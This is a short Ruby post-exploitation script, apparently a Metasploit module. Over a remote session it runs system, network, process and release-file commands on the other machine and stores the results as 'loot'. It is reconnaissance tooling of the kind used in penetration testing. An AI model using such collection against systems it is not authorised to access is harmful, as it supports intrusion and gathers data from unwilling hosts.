##
# $Id$
##

#
# Collect the system name file from the machine on the other end of the session.
#

print_status("Collecting the system information data.")

data = ''

#
# Get system information
#

target_files = [
	{:cmd => "uname -a", :ltype => "host.unix.uname", :ctype => "text/plain", :name => "uname.txt", :info => "uname -a"},
	{:cmd => "netstat -na", :ltype => "host.unix.netstat", :ctype => "text/plain", :name => "netstat.txt", :info => "netstat -na"},
	{:cmd => "ps -eaf", :ltype => "host.unix.processes", :ctype => "text/plain", :name => "processes.txt", :info => "ps -eaf"},
	{:cmd => "cat /etc/*-release", :ltype => "host.unix.release", :ctype => "text/plain", :name => "release.txt", :info => "system release information"},
]

target_files.each do |ent|
	data = client.shell_command_token_unix("#{ent[:cmd]} 2>/dev/null")
	if data and data.strip.length > 0
		pro.store_loot(ent[:ltype], ent[:ctype], client, data.strip, ent[:name], ent[:info])
	end
end

